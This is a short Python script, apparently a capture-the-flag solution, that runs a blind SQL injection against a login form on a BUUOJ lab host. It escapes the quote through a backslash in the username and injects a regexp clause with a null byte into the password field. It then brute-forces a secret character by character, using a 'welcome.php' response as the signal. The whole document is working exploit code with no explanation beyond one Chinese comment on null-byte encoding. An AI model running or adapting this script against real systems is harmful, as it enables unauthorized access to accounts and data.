import requests
from urllib import parse
s = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&(),-./:;<=>@[\]_`{|}~'
flag=''
url="""http://145e202a-c871-4542-8761-75022ed7db66.node4.buuoj.cn:81/"""

for i in range(100):
    for j in s:
        data = {"username": "\\",
                "passwd":"||passwd/**/regexp/**/\"^{}\";{}".format((flag+j),parse.unquote('%00'))
                }
        # 注意再写python的时候传入%00不能直接传入,直接传会解码直接为空
        try:
            res = requests.post(url=url,data=data)
        except:
            continue
        if "welcome.php" in res.text:
            flag=flag+j
            print(flag)
            break
print(flag)
